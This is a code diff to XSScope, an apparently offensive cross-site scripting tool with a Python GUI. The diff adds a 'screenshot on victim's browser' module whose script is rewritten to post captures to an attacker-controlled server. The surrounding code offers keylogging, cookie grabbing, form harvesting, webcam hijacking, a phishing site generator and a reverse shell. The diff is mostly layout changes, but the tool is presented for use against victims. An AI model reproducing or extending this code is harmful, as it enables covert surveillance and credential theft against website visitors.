@@ -1,5 +1,4 @@
 import shutil
-import subprocess
 import webbrowser  # just for help to redirect to github project page
 from sys import platform  # avoid error(s) on unsupported commands
 import requests
@@ -67,11 +66,12 @@ def about():
 def agent_module():
     root1 = tk.Toplevel()
     root1.title("XSScope - XSS Agent Module")
-    root1.geometry('715x365')
+    root1.geometry('730x400')
     #root1.iconbitmap('x_logo_VYw_icon.ico')
     root1.resizable(0,0)
 
     xss_keylogger_var = tk.IntVar()
+    xss_screenshot_var = tk.IntVar()
     xss_xhr_harvester_var = tk.IntVar()
     xss_cookie_grabber_var = tk.IntVar()
     xss_changelinks_var = tk.IntVar()
@@ -139,6 +139,19 @@ http://canyouseeme.org
         root1.update_idletasks()
 
         html_file = []
+
+        # code for screenshot dynamically generated
+        with open('config/screenshot.js') as screenshot_conf:
+            screenshot_code = screenshot_conf.readlines()
+            screenshot_code[5] = "var postDest = 'http://" + tcp_server + "/saveshot.php?png=';\n"
+
+        with open('config/screenshot.js', "w") as screenshot_conf:
+            screenshot_conf.writelines(screenshot_code)
+            screenshot_conf.close()
+
+        #defining the final .js code into the variable
+        screenshot_conf_payload = str(open('config/screenshot.js', 'r').read())
+
         keylogger_code = '''document.onkeypress = function(evt) {
 	evt = evt || window.event
 	key = String.fromCharCode(evt.charCode)
@@ -303,6 +316,10 @@ myFunction()
                 html_file.append(keylogger_code)
             else:
                 pass
+            if xss_screenshot_var.get() == 1:
+                html_file.append(screenshot_conf_payload)
+            else:
+                pass
             if xss_xhr_harvester_var.get() == 1:
                 html_file.append(xhr_harverster_code)
             else:
@@ -377,9 +394,10 @@ myFunction()
 
     # HTML Frame Module
     root4_frame = LabelFrame(root1, text="HTML Module Frame (will export as .html)")
-    root4_frame.place(x=5, y=240)
+    root4_frame.place(x=5, y=260)
 
-    xss_webcam = tk.Checkbutton(root4_frame, text="Persistent webcam hijacking. (requires permission) ",variable=xss_webcam_var, command=refresh_webcam_status)
+    xss_webcam = tk.Checkbutton(root4_frame, text="Persistent webcam hijacking. (requires permission)                             ",
+                                variable=xss_webcam_var, command=refresh_webcam_status)
     xss_webcam.grid(row=0, column=0)
 
     xss_webcam_interval_text = tk.Label(root4_frame, text="Capture Interval (ms): ", state="disabled")
@@ -388,7 +406,7 @@ myFunction()
     xss_webcam_interval = tk.Entry(root4_frame, width=10, state="disabled")
     xss_webcam_interval.grid(row=0, column=2)
 
-    xss_keyloggerjs = tk.Checkbutton(root4_frame, text="Keyboard spying (js active keylogger)                      ",variable=xss_keyloggerjs_var)
+    xss_keyloggerjs = tk.Checkbutton(root4_frame, text="Keyboard spying (js active keylogger)                                                   ",variable=xss_keyloggerjs_var)
     xss_keyloggerjs.grid(row=1, column=0)
 
     #network settings frame root1_frame
@@ -413,7 +431,7 @@ myFunction()
     load_server_button.grid(row=0, column=4)
 
     help_frame = LabelFrame(root1, text="")
-    help_frame.place(x=666, y=14)
+    help_frame.place(x=685, y=14)
 
     help_button = tk.Button(help_frame, text="?", command=print_help)
     help_button.grid(row=0, column=0)
@@ -422,20 +440,23 @@ myFunction()
     root2_frame = LabelFrame(root1, text="XSS Module Frame")
     root2_frame.place(x=5, y=55)
 
-    xss_keylogger = tk.Checkbutton(root2_frame, text="Keyboard spying (active keylogger)                                                                                                            ", variable=xss_keylogger_var)
+    xss_keylogger = tk.Checkbutton(root2_frame, text="Keyboard spying (active keylogger)                                                                                                                  ", variable=xss_keylogger_var)
     xss_keylogger.grid(row=1, column=0)
 
-    xss_xhr_harvester = tk.Checkbutton(root2_frame, text="Monitor every Entry form in the website.                                                                                                    ", variable=xss_xhr_harvester_var)
-    xss_xhr_harvester.grid(row=2, column=0)
+    xss_screenshot = tk.Checkbutton(root2_frame, text="Take screenshot on victim's browser                                                                                                                 ", variable=xss_screenshot_var)
+    xss_screenshot.grid(row=2, column=0)
 
-    xss_cookie_grabber = tk.Checkbutton(root2_frame, text="Grab the victim cookies (if any)                                                                                                                   ", variable=xss_cookie_grabber_var)
-    xss_cookie_grabber.grid(row=3, column=0)
+    xss_xhr_harvester = tk.Checkbutton(root2_frame, text="Monitor every Entry form in the website                                                                                                           ", variable=xss_xhr_harvester_var)
+    xss_xhr_harvester.grid(row=4, column=0)
+
+    xss_cookie_grabber = tk.Checkbutton(root2_frame, text="Grab the victim cookies (if any)                                                                                                                         ", variable=xss_cookie_grabber_var)
+    xss_cookie_grabber.grid(row=5, column=0)
 
     #-----------xss modules frames (for fun) inside the main module frame
     root3_frame = LabelFrame(root2_frame, text="Funny Module Frame")
-    root3_frame.grid(row=4, column=0)
+    root3_frame.grid(row=6, column=0)
 
-    xss_changelinks = tk.Checkbutton(root3_frame, text="Change every link in the website.    ", variable=xss_changelinks_var, command=changelink_function)
+    xss_changelinks = tk.Checkbutton(root3_frame, text="Change every link in the website.         ", variable=xss_changelinks_var, command=changelink_function)
     xss_changelinks.grid(row=0, column=0)
 
     changelinks_text = tk.Label(root3_frame, text=" Replaced URL: ", state="disabled")
@@ -444,7 +465,7 @@ myFunction()
     changelinks_entry = tk.Entry(root3_frame, width=40, state="disabled")
     changelinks_entry.grid(row=0, column=2)
 
-    xss_changeimages = tk.Checkbutton(root3_frame, text="Change every image in the website.", variable=xss_changeimages_var, command=image_loader)
+    xss_changeimages = tk.Checkbutton(root3_frame, text="Change every image in the website.     ", variable=xss_changeimages_var, command=image_loader)
     xss_changeimages.grid(row=1, column=0)
 
     image_URL_text = tk.Label(root3_frame, text=" Image URL: ", state="disabled")
@@ -453,7 +474,7 @@ myFunction()
     image_URL_loader = tk.Entry(root3_frame, width=40, state="disabled")
     image_URL_loader.grid(row=1, column=2)
 
-    xss_clickjacker = tk.Checkbutton(root3_frame, text="Trolling clickjacker.                           ", variable=xss_clickjacker_var, command=clickjack_function)
+    xss_clickjacker = tk.Checkbutton(root3_frame, text="Trolling clickjacker.                                ", variable=xss_clickjacker_var, command=clickjack_function)
     xss_clickjacker.grid(row=2, column=0)
 
     URL_redirection_text = tk.Label(root3_frame, text=" Redirect URL: ", state="disabled")
@@ -464,9 +485,9 @@ myFunction()
 
     #-------Output of the loading bar and button
     root5_frame = LabelFrame(root1, text="")
-    root5_frame.place(x=5, y=320)
+    root5_frame.place(x=5, y=335)
 
-    loading_bar = ttk.Progressbar(root5_frame, orient = HORIZONTAL, length= 555, mode = 'determinate')
+    loading_bar = ttk.Progressbar(root5_frame, orient = HORIZONTAL, length= 570, mode = 'determinate')
     loading_bar.grid(row=0, column=0)
 
     build_payload_button = tk.Button(root5_frame, text="Build the payload", command=xss_build)
@@ -517,7 +538,7 @@ def check_update():
 
 def show_payload():
     root3 = tk.Toplevel()
-    root3.title("XSScope v.1.5 - All XSS Payloads")
+    root3.title("XSScope v.1.6 - All XSS Payloads")
     root3.geometry('750x580')
     #root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
@@ -713,7 +734,7 @@ def show_payload():
 
 def phishing_website():
     root4 = tk.Toplevel()
-    root4.title("XSScope v.1.5 - Phishing Website Generator")
+    root4.title("XSScope v.1.6 - Phishing Website Generator")
     root4.geometry('1000x1000')
     root4.resizable(0, 0)
     # root4.iconbitmap('x_logo_VYw_icon.ico')
@@ -723,7 +744,7 @@ def phishing_website():
 
     def show_payloads_html():
         root3_html = tk.Toplevel()
-        root3_html.title("XSScope v.1.5 - All XSS Payloads for generated HTML code")
+        root3_html.title("XSScope v.1.6 - All XSS Payloads for generated HTML code")
         root3_html.geometry('750x580')
         # root3_html.iconbitmap('x_logo_VYw_icon.ico')
         root3_html.resizable(0, 0)
@@ -1146,7 +1167,7 @@ def reverse_shell():
 def main():
     #setting up the whole gui properties
     root = tk.Tk()
-    root.title("XSScope v.1.5")
+    root.title("XSScope v.1.6")
     root.geometry('410x100')
     #root.iconbitmap('x_logo_VYw_icon.ico')
     root.resizable(0,0)
